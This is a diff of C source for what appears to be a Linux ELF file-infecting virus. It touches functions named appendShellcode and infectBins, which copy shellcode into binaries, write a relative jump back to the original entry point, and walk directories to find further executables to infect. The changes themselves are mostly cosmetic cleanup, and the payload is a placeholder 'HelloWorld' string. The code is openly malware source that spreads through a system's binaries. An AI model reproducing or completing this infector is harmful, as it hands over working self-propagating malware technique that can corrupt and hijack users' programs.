@@ -10,7 +10,7 @@ static void  start(void) {}
 #include <dirent.h>
 #include <elf.h>
 
-#define BUF_SIZE 1024*1024*5
+#define BUF_SIZE 1024 * 1024 * 5
 #define PAYLOAD "HelloWorld"
 
 typedef off_t off64_t;
@@ -311,18 +311,17 @@ static void  appendSignature(struct bfile file, size_t offset) {
 }
 
 static int  appendShellcode(struct bfile *bin) {
-  struct bfile  new;
   size_t  size;
+  char    ins[5];
+  size_t  address;
+  struct bfile  new;
 
   size = end - start + (lambdaEnd - lambdaStart);
   new.size = bin->size + size + 5;
   if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
-  /* memset(((void *)new.header) + bin->size, 0xcc, 1); */
   memcpy(((void *)new.header) + bin->size, start, size);
-  char    ins[5];
-  size_t  address;
   address = -(0xc000000 + bin->size - bin->header->e_entry + size + 5);
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
@@ -330,7 +329,6 @@ static int  appendShellcode(struct bfile *bin) {
   ins[3] = (address >> 16) & 0xff;
   ins[4] = (address >> 24) & 0xff;
   memcpy(((void *)new.header) + bin->size + size, ins, 5);
-  /* memset(((void *)new.header) + bin->size + size, 0xcc, 5); */
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
@@ -412,7 +410,6 @@ static int  infectBins(const char *dirname) {
 
   if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
     return (-1);
-  // TODO Dirs with size > BUF_SIZE
   if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
     return (-1);
   bpos = 0;
